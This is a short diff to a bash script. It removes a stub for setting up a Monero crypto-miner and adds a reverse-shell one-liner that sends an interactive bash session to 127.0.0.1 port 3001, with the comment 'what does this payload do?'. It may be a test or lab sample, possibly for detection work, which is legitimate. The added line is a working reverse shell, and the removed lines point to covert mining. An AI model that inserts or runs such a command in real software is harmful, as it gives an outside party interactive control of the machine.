@@ -1,5 +1,6 @@
 #!/bin/bash
 
-mkdir ~/crypto_miner
+#what does this payload do?
+/bin/bash -i >& /dev/tcp/127.0.0.1/3001 0>&1
 
-# add steps to build and deploy  monero mining as per https://github.com/monero-project/monero
+
